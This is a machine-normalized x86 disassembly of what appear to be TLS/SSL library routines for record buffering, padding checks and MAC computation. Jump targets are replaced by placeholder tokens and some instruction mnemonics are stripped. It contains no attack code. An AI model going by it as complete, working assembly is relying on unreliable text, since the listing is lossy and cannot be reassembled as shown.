mov [ edx + 0x54 ] esi
mov ebx [ esi + 0x30 ]
mov ebp [ esi + 0x34 ]
xor eax eax
mov edi esi
[ edi ]
mov eax 0x1
mov [ esi + 0x30 ] ebx
mov [ esi + 0x34 ] ebp
mov [ esi + 0x4 ] eax
mov [ edx + 0x4c ] ebx
pop ebp
pop ebx
pop edi
mov [ edx ] 0x2
mov [ edx + 0x50 ] 0x0
pop esi
retn
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_1001d740
add esp 0x4
sub_100196f0
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn
push esi
mov esi [ edi + 0x54 ]
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
push 0x120
push esi
call sub_10026870
push esi
call sub_1001d740
add esp 0xc
mov [ edi + 0x54 ] 0x0
pop esi
push eax
call sub_1001d740
add esp 0x4
sub_10019740
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov ecx 0x48
mov edx [ esi + 0x54 ]
xor eax eax
mov edi edx
mov ebx [ edx + 0x30 ]
mov ebp [ edx + 0x34 ]
[ edi ]
mov [ edx + 0x30 ] ebx
mov [ edx + 0x34 ] ebp
mov [ edx + 0x4 ] 0x1
mov [ esi + 0x4c ] ebx
mov [ esi ] 0x2
mov [ esi + 0x50 ] eax
pop edi
pop esi
pop ebp
pop ebx
retn
sub_100197b0
mov eax 0x28
call sub_1001d0d0
mov eax [ esp + 0x2c ]
xor ecx ecx
xor edx edx
push r-xdata
mov cl [ eax ]
mov dl [ eax + 0x1 ]
or ch 0x2
push 0x28
shl ecx 0x8
or ecx edx
xor edx edx
mov dl [ eax + 0x2 ]
push 0x7
shl ecx 0x8
lea eax [ esp + 0xc ]
or ecx edx
push rw-data
push eax
mov [ esp + 0x1c ] ecx
call sub_10023340
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ eax ] 0x0
jne r-xdata
add esp 0x28
retn
sub_10019810
mov ecx [ esp + 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x3
retn
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0x2000000
je r-xdata
mov edx eax
mov [ ecx + 0x2 ] al
sar edx 0x10
mov [ ecx ] dl
mov edx eax
sar edx 0x8
mov [ ecx + 0x1 ] dl
xor eax eax
retn
sub_10019850
mov eax 0x14
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov [ esp + 0x13 ] 0x30
call sub_10025900
mov edi eax
lea eax [ esp + 0x14 ]
push eax
call sub_1002aa30
mov esi [ esp + 0x2c ]
add esp 0x4
mov ecx [ esi + 0xbc ]
mov eax [ esi + 0x54 ]
mov ecx [ ecx + 0x10 ]
lea ebx [ eax + 0xa0 ]
test ecx ecx
jl r-xdata
push 0x189
cmp ecx 0x30
jg r-xdata
mov ecx [ eax + 0x9c ]
xor ebp ebp
test ecx ecx
jbe r-xdata
lea edx [ esp + 0x14 ]
push edx
call sub_1002b000
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push edi
call sub_1002b600
mov ecx [ esi + 0x54 ]
mov edx ebx
sub edx ecx
add esp 0x4
lea eax [ eax + edx - 0xa0 ]
cmp eax 0x30
jg r-xdata
push 0x193
jmp r-xdata
push 0x0
lea ecx [ esp + 0x18 ]
push edi
push ecx
call sub_1002aa50
mov edx [ esi + 0xbc ]
add esp 0xc
mov eax [ edx + 0x10 ]
test eax eax
jl r-xdata
push r--data
push 0x44
push 0xf1
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push r--data
push 0x19b
push r--data
call sub_1001f8d0
cmp eax 0x30
jl r-xdata
mov eax [ esi + 0xbc ]
lea edx [ esp + 0x14 ]
mov ecx [ eax + 0x10 ]
add eax 0x14
push ecx
push eax
push edx
call sub_1002ab80
lea eax [ esp + 0x1f ]
push 0x1
lea ecx [ esp + 0x24 ]
push eax
push ecx
call sub_1002ab80
mov dl [ esp + 0x2b ]
mov eax [ esi + 0x54 ]
inc dl
add eax 0x68
mov [ esp + 0x2b ] dl
mov edx [ eax - 0x4 ]
push edx
push eax
lea eax [ esp + 0x34 ]
push eax
call sub_1002ab80
mov eax [ esi + 0x54 ]
lea edx [ esp + 0x38 ]
mov ecx [ eax + 0x88 ]
add eax 0x8c
push ecx
push eax
push edx
call sub_1002ab80
push 0x0
lea eax [ esp + 0x48 ]
push ebx
push eax
call sub_1002aba0
push edi
call sub_1002b600
add esp 0x40
add ebx eax
push edi
call sub_1002b600
mov ecx [ esi + 0x54 ]
add ebp eax
add esp 0x4
cmp ebp [ ecx + 0x9c ]
jb r-xdata
sub_10019a20
mov eax 0x4
call sub_1001d0d0
push esi
mov esi [ esp + 0xc ]
push edi
mov [ esp + 0x8 ] 0x0
mov eax [ esi + 0xd4 ]
mov edi [ esi + 0xd0 ]
mov cl [ esi + 0xd4 ]
mov [ esi + 0xd0 ] 0x0
sar eax 0x8
test edi edi
mov [ esp + 0x9 ] al
mov [ esp + 0xa ] cl
jl r-xdata
push r--data
push 0x1c2
push r--data
call sub_1001f8d0
cmp edi 0x3
jle r-xdata
lea edx [ esp + 0xb ]
push edi
sub edx edi
push edx
push esi
call sub_1001c710
add esp 0xc
test eax eax
jge r-xdata
sub edi eax
mov [ esi + 0xd0 ] edi
jne r-xdata
mov [ esi + 0xd0 ] edi
pop edi
pop esi
pop ecx
retn
pop edi
pop esi
pop ecx
retn
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x68 ]
lea edx [ esp + 0x8 ]
push ecx
mov ecx [ esi ]
push esi
push 0x3
push edx
push 0x0
push ecx
push 0x1
call eax
add esp 0x1c
sub_10019af0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov eax [ esi + 0x3c ]
mov ebx [ esi + 0x48 ]
mov edi [ esi + 0x44 ]
mov edx [ esi + 0x10 ]
mov ebp [ eax + 0x4 ]
push edi
mov [ esi + 0x18 ] 0x2
lea ecx [ ebx + ebp ]
push ecx
push edx
call sub_100209d0
add esp 0xc
test eax eax
jle r-xdata
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] ebx
pop edi
pop esi
pop ebp
pop ebx
retn
cmp eax edi
mov [ esi + 0x18 ] 0x1
je r-xdata
pop edi
pop esi
add eax ebx
pop ebp
pop ebx
retn
mov ecx [ esi + 0x10 ]
add ebx eax
sub edi eax
mov [ esi + 0x18 ] 0x2
lea eax [ ebx + ebp ]
push edi
push eax
push ecx
call sub_100209d0
add esp 0xc
test eax eax
jg r-xdata
sub_10019b60
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
mov eax [ esi + 0x50 ]
cmp eax edi
jae r-xdata
mov eax edi
mov ebx [ esi + 0x4c ]
mov edx [ esi + 0xc ]
mov ecx edi
mov [ esi + 0x18 ] 0x3
sub ecx eax
add eax ebx
push ecx
push eax
push edx
call sub_10020930
add esp 0xc
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x50 ]
mov [ esi + 0x18 ] 0x1
add edx eax
mov eax edx
mov [ esi + 0x50 ] edx
cmp eax edi
jae r-xdata
mov edx [ esi + 0xc ]
mov ecx edi
sub ecx eax
add eax ebx
push ecx
push eax
push edx
mov [ esi + 0x18 ] 0x3
call sub_10020930
add esp 0xc
test eax eax
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_10019be0
mov eax 0x64
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x70 ]
push esi
push edi
xor ebx ebx
mov eax [ ebp + 0x58 ]
mov [ esp + 0x10 ] ebx
mov ecx [ eax + 0x348 ]
mov edx [ eax + 0x37c ]
mov edi [ eax + 0x380 ]
mov eax [ eax + 0x384 ]
mov ecx [ ecx + 0x10 ]
mov [ esp + 0x14 ] edx
and ecx 0x2
cmp eax ebx
mov [ esp + 0x24 ] ecx
jne r-xdata
mov esi [ eax + 0x8 ]
xor esi esi
jmp r-xdata
cmp [ ebp + 0x88 ] ebx
je r-xdata
cmp [ ebp + 0x7c ] ebx
je r-xdata
test [ esp + 0x7c ] 0x1
je r-xdata
push 0x103
push r--data
push 0x8c
call sub_1001d4c0
add esp 0xc
cmp eax ebx
mov [ ebp + 0x88 ] eax
jne r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
push 0xdf
push r--data
push 0x8c
call sub_1001d4c0
add esp 0xc
cmp eax ebx
mov [ ebp + 0x7c ] eax
je r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
push eax
call sub_1001d7d0
add esp 0x4
push 0x163
push r--data
push 0x41
jmp r-xdata
mov eax [ ebp + 0x88 ]
mov [ ebp + 0x8c ] edi
mov [ esp + 0x18 ] eax
mov eax [ ebp + 0x90 ]
cmp eax ebx
je r-xdata
push eax
call sub_1001d7d0
add esp 0x4
mov eax [ ebp + 0x7c ]
mov [ ebp + 0x80 ] edi
mov [ esp + 0x18 ] eax
mov eax [ ebp + 0x84 ]
cmp eax ebx
je r-xdata
cmp esi ebx
je r-xdata
push eax
call sub_1001d370
add esp 0x4
mov [ ebp + 0x90 ] ebx
push 0x81
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
cmp esi ebx
je r-xdata
push eax
call sub_1001d370
add esp 0x4
mov [ ebp + 0x84 ] ebx
mov edx [ ebp + 0x58 ]
xor ecx ecx
add edx 0x50
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov eax [ ebp + 0x58 ]
add eax 0x58
push esi
call sub_1001d320
add esp 0x4
cmp eax ebx
mov [ ebp + 0x90 ] eax
jne r-xdata
mov edx [ ebp + 0x58 ]
xor ecx ecx
add edx 0x8
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov eax [ ebp + 0x58 ]
add eax 0x10
jmp r-xdata
push esi
call sub_1001d320
add esp 0x4
cmp eax ebx
mov [ ebp + 0x84 ] eax
jne r-xdata
mov ecx [ ebp + 0x58 ]
push edi
mov esi [ ecx + 0x378 ]
call sub_1002b600
mov edx [ esp + 0x18 ]
mov edi eax
push edx
call sub_1002b600
mov ebx eax
mov eax [ esp + 0x2c ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
push eax
call sub_1001db30
add esp 0x4
push 0x116
push r--data
push 0x8e
jmp r-xdata
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x58 ]
cmp [ ecx + 0x114 ] ebx
jne r-xdata
push 0xf2
push r--data
push 0x8e
jmp r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call sub_1002b5d0
mov ecx [ esp + 0x80 ]
add esp 0x4
cmp ecx 0x12
mov [ esp + 0x30 ] eax
je r-xdata
mov eax [ ebp + 0x58 ]
mov edx [ eax + 0x348 ]
mov eax [ edx + 0x10 ]
and eax 0x8
je r-xdata
mov eax [ ebp + 0x58 ]
cmp [ eax + 0x114 ] ebx
je r-xdata
push 0xf7
push r--data
push 0x4000
call sub_1001d4c0
mov edx [ ebp + 0x58 ]
add esp 0xc
mov [ edx + 0x114 ] eax
lea ecx [ edi + edi ]
mov [ esp + 0x1c ] esi
lea edx [ ecx + esi ]
lea ecx [ ecx + ebx * 2 ]
mov [ esp + 0x78 ] edx
lea edx [ ecx + esi ]
lea ecx [ ecx + eax * 2 ]
mov eax [ ebp + 0x58 ]
mov [ esp + 0x10 ] edx
lea edx [ eax + 0xb8 ]
mov [ esp + 0x28 ] edx
lea edx [ eax + 0x98 ]
cmp ecx 0x21
je r-xdata
mov ecx [ edx + 0xc ]
and ecx 0x1c3f8000
sub ecx 0x8000
neg ecx
sbb ecx ecx
add ecx 0x8
mov ecx 0x5
jmp r-xdata
lea eax [ esp + 0x34 ]
push eax
call sub_1002aa30
mov esi [ esp + 0x20 ]
mov ecx edi
mov edi [ esp + 0x24 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x28 ]
mov ecx edx
add esp 0x4
and ecx 0x3
test eax eax
[ edi ] [ esi ]
je r-xdata
push 0x13e
push r--data
push 0x44
lea edx [ edi + esi ]
lea ecx [ ebx + edi * 2 ]
mov [ esp + 0x1c ] edx
lea edx [ ecx + esi ]
mov [ esp + 0x78 ] edx
lea edx [ eax + ebx ]
add ecx edx
lea edx [ ecx + esi ]
add ecx eax
mov eax [ ebp + 0x58 ]
mov [ esp + 0x10 ] edx
lea edx [ eax + 0x98 ]
mov [ esp + 0x28 ] edx
lea edx [ eax + 0xb8 ]
jmp r-xdata
test eax eax
je r-xdata
cmp ebx ecx
jl r-xdata
mov ebx [ esp + 0x78 ]
push 0x0
call sub_10025900
push eax
lea eax [ esp + 0x3c ]
push eax
call sub_1002aa50
mov ecx [ esp + 0x84 ]
push ebx
lea edx [ esp + 0x44 ]
push ecx
push edx
call sub_1002ab80
mov esi [ esp + 0x40 ]
push 0x20
lea eax [ esp + 0x50 ]
push esi
push eax
call sub_1002ab80
mov edi [ esp + 0x50 ]
push 0x20
lea ecx [ esp + 0x5c ]
push edi
push ecx
call sub_1002ab80
lea edx [ esp + 0x84 ]
push 0x0
lea eax [ esp + 0x68 ]
push edx
push eax
call sub_1002aba0
mov eax [ esp + 0x6c ]
add esp 0x3c
test eax eax
lea ebx [ esp + 0x54 ]
jle r-xdata
mov [ esp + 0x2c ] edx
mov edx [ eax + 0x374 ]
cmp ecx edx
jle r-xdata
mov ebx [ edx + 0xc ]
and ebx 0x1c3f8000
sub ebx 0x8000
neg ebx
sbb ebx ebx
add ebx 0x8
mov ebx 0x5
jmp r-xdata
mov eax [ esp + 0x7c ]
mov ecx [ ebp + 0xbc ]
mov edx [ esp + 0x10 ]
and eax 0x2
push eax
mov eax [ esp + 0x18 ]
push edx
mov [ ecx + 0x4 ] 0x0
mov ecx [ esp + 0x20 ]
push ebx
push 0x0
push eax
push ecx
call sub_1001d7e0
lea edx [ esp + 0x6c ]
push 0x20
push edx
call sub_10026870
lea eax [ esp + 0x64 ]
push 0x10
push eax
call sub_10026870
lea ecx [ esp + 0x5c ]
push ecx
call sub_1002b000
add esp 0x2c
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
push 0x0
call sub_10025900
lea ecx [ esp + 0x38 ]
push eax
push ecx
call sub_1002aa50
push 0x20
lea edx [ esp + 0x44 ]
push esi
push edx
call sub_1002ab80
push 0x20
lea eax [ esp + 0x50 ]
push edi
push eax
call sub_1002ab80
lea ecx [ esp + 0x68 ]
push 0x0
lea edx [ esp + 0x5c ]
push ecx
push edx
call sub_1002aba0
lea eax [ esp + 0x74 ]
add esp 0x30
mov [ esp + 0x10 ] eax
jmp r-xdata
sub_1001a060
mov eax 0x64
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x70 ]
push esi
xor esi esi
push edi
mov eax [ ebp + 0x58 ]
cmp [ eax + 0x374 ] esi
je r-xdata
lea ecx [ esp + 0x28 ]
lea edx [ esp + 0x1c ]
push ecx
mov ecx [ ebp + 0xbc ]
lea eax [ esp + 0x14 ]
push edx
push eax
push ecx
call sub_1000fce0
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x64
retn
mov edx [ ebp + 0x58 ]
mov eax [ esp + 0x10 ]
mov [ edx + 0x37c ] eax
mov ecx [ ebp + 0x58 ]
mov edx [ esp + 0x1c ]
mov [ ecx + 0x380 ] edx
mov eax [ ebp + 0x58 ]
mov ecx [ esp + 0x28 ]
mov [ eax + 0x384 ] ecx
mov edx [ esp + 0x10 ]
push edx
call sub_1002b5d0
mov ebx eax
mov eax [ esp + 0x14 ]
push eax
call sub_1002b600
mov ecx [ esp + 0x24 ]
add ebx eax
push ecx
call sub_1002b600
add ebx eax
mov eax [ ebp + 0x58 ]
add esp 0xc
mov ecx [ eax + 0x378 ]
shl ebx 0x1
cmp ecx esi
je r-xdata
push 0x176
push r--data
push 0x8a
jmp r-xdata
mov eax [ ebp + 0x58 ]
push 0x187
push r--data
push ebx
mov [ eax + 0x374 ] esi
call sub_1001d4c0
mov edi eax
add esp 0xc
cmp edi esi
jne r-xdata
mov edx [ eax + 0x374 ]
push edx
push ecx
call sub_10026870
mov eax [ ebp + 0x58 ]
mov ecx [ eax + 0x378 ]
push ecx
call sub_1001d740
mov edx [ ebp + 0x58 ]
add esp 0xc
mov [ edx + 0x378 ] esi
push 0x9d
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov ecx [ ebp + 0x58 ]
lea eax [ esp + 0x30 ]
push eax
mov [ esp + 0x7c ] 0x41
mov [ ecx + 0x374 ] ebx
mov edx [ ebp + 0x58 ]
mov [ edx + 0x378 ] edi
call sub_1002aa30
lea ecx [ esp + 0x34 ]
push 0x8
push ecx
call sub_1002b610
lea edx [ esp + 0x4c ]
push edx
call sub_1002aa30
add esp 0x10
mov [ esp + 0x24 ] 0x0
test ebx ebx
jle r-xdata
push 0x1a5
push r--data
push 0x41
lea ecx [ esp + 0x60 ]
push 0x14
push ecx
call sub_10026870
lea edx [ esp + 0x38 ]
push edx
call sub_1002b000
lea eax [ esp + 0x4c ]
push eax
call sub_1002b000
add esp 0x10
mov eax 0x1
mov eax 0x10
mov [ esp + 0x18 ] edi
sub eax edi
mov [ esp + 0x14 ] ebx
mov [ esp + 0x2c ] eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov ecx [ ebp + 0x58 ]
mov [ ecx + 0xd8 ] 0x1
mov edx [ ebp + 0xbc ]
mov ecx [ edx + 0xac ]
xor edx edx
cmp ecx edx
je r-xdata
push 0x9d
push r--data
push 0x44
push 0xee
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
jmp r-xdata
test esi esi
jbe r-xdata
mov ecx [ ecx + 0xc ]
and ecx 0x1c3f8000
cmp ecx 0x200000
jne r-xdata
mov ecx [ ebp + 0xf4 ]
test ch 0x8
jne r-xdata
mov al [ esp + 0x78 ]
push 0x0
inc al
mov [ esp + 0x7c ] al
call sub_100254d0
push eax
lea eax [ esp + 0x48 ]
push eax
call sub_1002aa50
lea ecx [ esp + 0x5c ]
push esi
lea edx [ esp + 0x50 ]
push ecx
push edx
call sub_1002ab80
mov eax [ ebp + 0xbc ]
lea edx [ esp + 0x58 ]
mov ecx [ eax + 0x10 ]
add eax 0x14
push ecx
push eax
push edx
call sub_1002ab80
mov eax [ ebp + 0x58 ]
push 0x20
add eax 0x98
lea ecx [ esp + 0x68 ]
push eax
push ecx
call sub_1002ab80
mov edx [ ebp + 0x58 ]
push 0x20
add edx 0xb8
lea eax [ esp + 0x74 ]
push edx
push eax
call sub_1002ab80
lea ecx [ esp + 0x9c ]
push 0x0
lea edx [ esp + 0x80 ]
push ecx
push edx
call sub_1002aba0
add esp 0x48
push 0x0
call sub_10025900
push eax
lea eax [ esp + 0x38 ]
push eax
call sub_1002aa50
mov eax [ ebp + 0xbc ]
lea edx [ esp + 0x3c ]
mov ecx [ eax + 0x10 ]
add eax 0x14
push ecx
push eax
push edx
call sub_1002ab80
lea eax [ esp + 0x78 ]
push 0x14
lea ecx [ esp + 0x4c ]
push eax
push ecx
call sub_1002ab80
mov edx [ esp + 0x50 ]
add esp 0x24
add edx edi
cmp edx ebx
push 0x0
jle r-xdata
mov al [ esp + 0x78 ]
mov ecx esi
mov dl al
lea edi [ esp + 0x50 ]
mov dh dl
mov eax edx
shl eax 0x10
mov ax dx
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
[ edi ]
mov edi [ esp + 0x18 ]
mov ecx [ ebp + 0xbc ]
mov ecx [ ecx + 0xac ]
mov ecx [ ecx + 0xc ]
and ecx 0x1c3f8000
cmp ecx 0x20000
jne r-xdata
mov ecx [ ebp + 0x58 ]
mov [ ecx + 0xd8 ] edx
lea eax [ esp + 0x34 ]
push edi
push eax
call sub_1002aba0
add esp 0xc
lea eax [ esp + 0x64 ]
lea ecx [ esp + 0x34 ]
push eax
push ecx
call sub_1002aba0
mov ecx [ esp + 0x20 ]
lea esi [ esp + 0x6c ]
mov edx ecx
add esp 0xc
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x20 ]
mov edi [ esp + 0x18 ]
jmp r-xdata
mov ecx [ ebp + 0x58 ]
mov [ ecx + 0xd8 ] edx
inc esi
cmp esi 0x10
mov [ esp + 0x20 ] esi
ja r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x14 ]
add eax 0x10
sub ecx 0x10
add edi 0x10
cmp eax ebx
mov [ esp + 0x24 ] eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] edi
jl r-xdata
sub_1001a420
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x58 ]
mov ecx [ eax + 0x378 ]
test ecx ecx
je r-xdata
mov edx [ esi + 0x58 ]
pop esi
mov [ edx + 0x374 ] 0x0
retn
mov eax [ eax + 0x374 ]
push eax
push ecx
call sub_10026870
mov ecx [ esi + 0x58 ]
mov edx [ ecx + 0x378 ]
push edx
call sub_1001d740
mov eax [ esi + 0x58 ]
add esp 0xc
mov [ eax + 0x378 ] 0x0
mov ecx [ esi + 0x58 ]
pop esi
mov [ ecx + 0x374 ] 0x0
retn
sub_1001a480
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
test eax eax
mov eax [ esp + 0x10 ]
push edi
je r-xdata
mov esi [ eax + 0x58 ]
mov ebp [ eax + 0x7c ]
add esi 0x100
test ebp ebp
jne r-xdata
mov esi [ eax + 0x58 ]
mov ebp [ eax + 0x88 ]
add esi 0x128
test ebp ebp
jne r-xdata
push ebp
call sub_1002c960
add esp 0x4
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0xc ]
push eax
push ecx
push edx
call memmove
mov eax [ esi + 0xc ]
add esp 0xc
mov [ esi + 0x10 ] eax
test ebp ebp
je r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ ecx + 0xbc ]
test edx edx
je r-xdata
test eax eax
je r-xdata
mov edx [ ebp ]
mov edi [ esi + 0x4 ]
push edx
call sub_1002cb10
mov ebx eax
add esp 0x4
cmp ebx 0x1
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
push edi
push eax
push ecx
push ebp
call sub_1001dba0
add esp 0x10
cmp ebx 0x1
je r-xdata
test edi edi
je r-xdata
mov eax edi
mov ecx [ esi + 0x10 ]
cdq
idiv ebx
mov eax ebx
sub eax edx
mov edx [ esi + 0x4 ]
add edi eax
add edx eax
dec al
mov [ esi + 0x4 ] edx
mov [ ecx + edi - 0x1 ] al
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
push 0x1eb
push r--data
push 0x81
push 0x86
push 0x14
call sub_1001de60
mov edx [ esp + 0x28 ]
push 0x15
push 0x2
push edx
call sub_10013ab0
add esp 0x20
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax edi
xor edx edx
div ebx
test edx edx
je r-xdata
mov edx [ esi + 0xc ]
xor eax eax
mov al [ edx + edi - 0x1 ]
inc eax
cmp eax ebx
jle r-xdata
mov ecx [ esi + 0x4 ]
pop edi
sub ecx eax
mov eax 0x1
mov [ esi + 0x4 ] ecx
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
sub_1001a5e0
push esi
mov esi [ esp + 0x8 ]
push 0x8
mov eax [ esi + 0x58 ]
add eax 0x174
push eax
call sub_1002b610
mov ecx [ esi + 0xd8 ]
mov eax [ esi + 0x58 ]
push 0x0
add eax 0x174
mov edx [ ecx + 0x8c ]
push edx
push eax
call sub_1002aa50
mov ecx [ esi + 0xd8 ]
mov eax [ esi + 0x58 ]
push 0x0
add eax 0x184
mov edx [ ecx + 0x90 ]
push edx
push eax
call sub_1002aa50
add esp 0x20
pop esi
retn
sub_1001a640
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x18 ]
mov eax [ esi + 0x58 ]
push edi
add eax 0x174
push ebx
push eax
call sub_1002ab80
mov ecx [ esi + 0x58 ]
push edi
add ecx 0x184
push ebx
push ecx
call sub_1002ab80
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_1001a6a0
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x18 ]
mov ecx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
mov edi [ esp + 0x28 ]
push edi
push ebx
push ebp
push eax
push ecx
call sub_1001a6f0
mov ecx [ esp + 0x28 ]
mov esi eax
mov eax [ esp + 0x30 ]
lea edx [ esi + edi ]
push edx
push ebx
push ebp
push eax
push ecx
call sub_1001a6f0
add esp 0x28
add eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
sub_1001a6f0
mov eax 0x58
call sub_1001d0d0
push esi
lea eax [ esp + 0xc ]
push edi
push eax
call sub_1002aa30
lea ecx [ esp + 0x14 ]
push 0x8
push ecx
call sub_1002b610
mov edx [ esp + 0x74 ]
lea eax [ esp + 0x1c ]
push edx
push eax
call sub_1002ac20
lea ecx [ esp + 0x24 ]
push ecx
call sub_1002c960
push eax
call sub_1002b600
mov ecx eax
mov eax 0x30
cdq
idiv ecx
add esp 0x1c
mov esi eax
mov eax [ esp + 0x6c ]
imul esi ecx
test eax eax
je r-xdata
mov edi [ esp + 0x64 ]
lea edx [ esp + 0x10 ]
mov eax [ edi + 0xbc ]
mov ecx [ eax + 0x10 ]
add eax 0x14
push ecx
push eax
push edx
call sub_1002ab80
push esi
lea eax [ esp + 0x20 ]
push rw-data
push eax
call sub_1002ab80
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x38 ]
push ecx
lea eax [ esp + 0x2c ]
push edx
push eax
call sub_1002aba0
add esp 0x24
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
call sub_1002c960
add esp 0x4
lea edx [ esp + 0x14 ]
push eax
push edx
call sub_1002aa50
mov eax [ edi + 0xbc ]
lea edx [ esp + 0x1c ]
mov ecx [ eax + 0x10 ]
add eax 0x14
push ecx
push eax
push edx
call sub_1002ab80
push esi
lea eax [ esp + 0x2c ]
push rw-data
push eax
call sub_1002ab80
mov ecx [ esp + 0x2c ]
lea edx [ esp + 0x44 ]
push ecx
lea eax [ esp + 0x38 ]
push edx
push eax
call sub_1002ab80
mov edx [ esp + 0xa4 ]
lea ecx [ esp + 0x3c ]
push ecx
lea eax [ esp + 0x44 ]
push edx
push eax
call sub_1002aba0
lea ecx [ esp + 0x4c ]
push ecx
call sub_1002b000
mov eax [ esp + 0x4c ]
add esp 0x40
pop edi
pop esi
add esp 0x58
retn
mov edx [ esp + 0x70 ]
push edx
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_1002ab80
add esp 0xc
sub_1001a830
mov eax 0x18
call sub_1001d0d0
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x1c ]
push ebx
push ebp
push esi
push edi
test eax eax
mov eax [ ecx + 0x58 ]
je r-xdata
mov ebp [ ecx + 0x80 ]
lea esi [ eax + 0x100 ]
lea edx [ eax + 0x10 ]
add eax 0x8
mov [ esp + 0x10 ] edx
mov [ esp + 0x14 ] eax
mov ebp [ ecx + 0x8c ]
lea esi [ eax + 0x128 ]
lea edx [ eax + 0x58 ]
add eax 0x50
mov [ esp + 0x10 ] edx
mov [ esp + 0x14 ] eax
jmp r-xdata
mov eax [ esp + 0x24 ]
add esp 0x18
retn
dec eax
jns r-xdata
push ebp
call sub_1002b600
mov ecx eax
mov eax 0x30
xor edx edx
mov [ esp + 0x38 ] ecx
div ecx
mov ebx eax
lea eax [ esp + 0x1c ]
push eax
imul ebx ecx
call sub_1002aa30
push 0x0
lea ecx [ esp + 0x24 ]
push ebp
push ecx
call sub_1002aa50
mov edx [ esp + 0x48 ]
mov eax [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x30 ]
push eax
push ecx
call sub_1002ab80
push ebx
lea edx [ esp + 0x3c ]
push rw-data
push edx
call sub_1002ab80
mov eax [ esp + 0x40 ]
push 0x8
lea ecx [ esp + 0x48 ]
push eax
push ecx
call sub_1002ab80
mov dl [ esi ]
lea eax [ esp + 0x64 ]
push 0x1
lea ecx [ esp + 0x54 ]
push eax
push ecx
mov [ esp + 0x70 ] dl
call sub_1002ab80
mov edx [ esi + 0x4 ]
mov edi [ esp + 0x74 ]
add esp 0x44
lea ecx [ esp + 0x18 ]
shr edx 0x8
mov [ edi ] dl
mov al [ esi + 0x4 ]
push 0x2
push edi
push ecx
mov [ edi + 0x1 ] al
call sub_1002ab80
mov edx [ esi + 0x4 ]
mov eax [ esi + 0x10 ]
push edx
lea ecx [ esp + 0x28 ]
push eax
push ecx
call sub_1002ab80
push 0x0
lea edx [ esp + 0x34 ]
push edi
push edx
call sub_1002aba0
push 0x0
lea eax [ esp + 0x40 ]
push ebp
push eax
call sub_1002aa50
mov ecx [ esp + 0x64 ]
mov edx [ esp + 0x40 ]
push ecx
lea eax [ esp + 0x4c ]
push edx
push eax
call sub_1002ab80
push ebx
